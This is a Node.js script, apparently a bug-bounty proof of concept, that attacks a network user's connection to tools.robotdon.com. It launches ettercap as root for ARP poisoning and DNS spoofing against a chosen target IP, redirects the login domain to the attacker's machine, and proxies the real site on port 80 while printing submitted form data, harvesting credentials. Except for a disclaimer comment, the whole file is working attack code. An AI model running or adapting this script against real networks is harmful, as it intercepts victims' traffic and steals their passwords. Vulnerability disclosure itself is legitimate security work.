#!/usr/bin/env node

/**
 * robotdon_mitm_bug
 *
 * Simple PoC for MiTM attack on robotdon.com
 * Disclaimer: NOT FOR MALICIOUS USAGE. ONLY MEANT
 * TO BE A PROOF-OF-CONCEPT FOR THE BUG BOUNTRY
 * PROGRAM.
 * 
 * Licensed under MIT.
 */

'use strict';

const proxy = require('express-http-proxy')
    , exec = require('child_process').exec
    , express = require('express')
    , qs = require('querystring')
    , app = express()
    , http = require('http').Server(app)
    , nif = process.argv[2]
    , target = process.argv[3]

/**
 * There should be exactly 2 arguments (the network
 * interface and the target IP) as well as 'node' and
 * the script path.
 */
if (!( nif && target )) {
  console.log('usage: node index.js [network interface] [target ip address]')
  process.exit(-1)
}

/**
 * Root access is required to run ettercap as well as
 * to open port 80.
 */
if ( process.getuid() !== 0 ) {
  console.error('Error: please run as root.')
  process.exit(-1)
}

/**
 * First we must spin up ettercap.
 * 
 * Basic description: will spin up ettercap on the given
 * network interface with the given target IP address and run
 * an arp poisioning attack as support for the DNS spoof plugin.
 * 
 * The plugin will then force certain DNS rules upon the target
 * such as an A record redirecting 'tools.robotdon.com' (the domain
 * where all registered and authentication happens) to the current
 * machine. 
 */
const ettercap = exec('ettercap -i ' + nif + ' -T -M arp -P dns_spoof /' + target + '//', (err, stdout, stderr) => {
  console.error(err)
  console.log(stdout)
  console.error(stderr)
})

/**
 * If ettercap ever dies, there is no point of running the attack
 * any more.
 */
ettercap.on('close', () => process.exit())

/**
 * express-http-proxy allows us to spin up an express app that will
 * proxy a given target site (in this case, tools.robotdon.com) and
 * will allow us to be part of major events in the proxy process.
 * 
 * We use 'decorateRequest' because this happens after a request is
 * sent but before a response occurs. This would be in between a form
 * submission and therefore allow us to view credentials.
 */
app.use(proxy('tools.robotdon.com', {
  decorateRequest: (req, res) => {
    // prints form data if it exists
    let content = req.bodyContent.trim()
    if (content) console.log(qs.parse(content))

    // return unmodified request to complete
    // the proxy effect
    return req
  }
}))

/**
 * Start the proxy server on :80 to complete the effect of
 * mimicking the robotdon server. Any other port would make
 * the attack pointless.
 */
http.listen(80, () => console.log('ready'))